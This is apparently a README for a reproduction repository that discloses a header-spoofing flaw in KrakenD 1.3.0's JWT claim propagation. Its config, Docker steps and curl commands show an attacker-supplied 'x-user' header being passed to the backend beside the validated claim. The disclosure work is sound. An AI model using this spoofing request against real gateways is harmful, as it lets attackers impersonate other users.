# krakend-header-pass-issue-minimal

This repository is a minimal setup for reproducing a security issue with the KrakenD API Gateway 
[JWT validation](https://www.krakend.io/docs/authorization/jwt-validation/),
which was observed in version 1.3.0 (other versions have not been tested).

## Problem Description

KrakenD can propagate claims from a validated JWT to the backend via custom HTTP headers.
For example to propagate the `sub` claim via the `x-user` header, the endpoint config looks like the following.

```
{
    "endpoint": "/protected",
    "method": "GET",
    "output_encoding": "no-op",
    "headers_to_pass": [
        "x-user"
    ],
    "backend": [
        {
            "host": ["http://echo:8080"],
            "url_pattern": "/",
            "encoding": "no-op"
        }
    ],
    "extra_config": {
        "github.com/devopsfaith/krakend-jose/validator": {
            "alg": "RS256",
            "jwk-url": "http://oidc-provider/.well-known/openid-configuration/jwks",
            "disable_jwk_security": true,
            "propagate-claims": [
                ["sub", "x-user"]
            ]
        }
    }
}
```

This is very useful, because backend services can rely on KrakenD to validate and parse JWTs.

However, if the `x-user` header is already present in the incoming request,
it is passed to the backend without being replaced by the propagated claim.

In this example this enables an attacker to impersonate other users.

## Running the example

First make sure you have `docker`, `docker-compose`, `curl` and `jq` installed.
Instead of `curl` and `jq` you can also use any other tool to send HTTP requests and parse JSON responses.

Start KrakenD, a mock OIDC provider and an echo backend service via Docker Compose.
The services will bind to `localhost:8080` (KrakenD) and `localhost:8081` (Mock OIDC Provider).

```
$ docker-compose up --force-recreate --renew-anon-volumes
```

Retrieve an access token (JWT) from the mock OIDC provider and store it into the `TEST_ACCESS_TOKEN` environment variable
```
export TEST_ACCESS_TOKEN=$(curl --location --request POST 'http://localhost:8081/connect/token' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'username=TestUser' \
--data-urlencode 'password=test' \
--data-urlencode 'grant_type=password' \
--data-urlencode 'scope=dummy' \
--data-urlencode 'client_id=test' \
--data-urlencode 'client_secret=test-secret' | jq -r '.access_token')
```

Call the protected endpoint and pass a custom `x-user` header.
```
curl --location --request GET "http://localhost:8080/protected" \
--header "authorization: Bearer ${TEST_ACCESS_TOKEN}" \
--header "x-user: i-am-evil"
```

The backend will echo a JSON representation of the HTTP request that was sent by KrakenD.
It should look something like the following.

```json
{
  "path": "/",
  "headers": {
    "host": "echo:8080",
    "user-agent": "KrakenD Version 1.3.0",
    "x-forwarded-for": "172.19.0.1",
    "x-forwarded-host": "localhost:8080",
    "x-user": "i-am-evil, test-user",
    "accept-encoding": "gzip"
  },
  "method": "GET",
  "body": "",
  "fresh": false,
  "hostname": "localhost",
  "ip": "172.19.0.1",
  "ips": [
    "172.19.0.1"
  ],
  "protocol": "http",
  "query": {},
  "subdomains": [],
  "xhr": false,
  "os": {
    "hostname": "c15b10b516c5"
  },
  "connection": {}
}
```

As you can see, the `x-user` header contains both, the value of the `sub` claim (`test-user`)
and the value of the original `x-user` header (`i-am-evil`).

The backend has no way of knowing, which value is to be trusted.
Even worse, most HTTP server frameworks provide some function like `request.getHeaderValue('x-user')`,
which returns the first value of the header if there is more than one value.
In such cases the attacker has successfully impersonated another user.
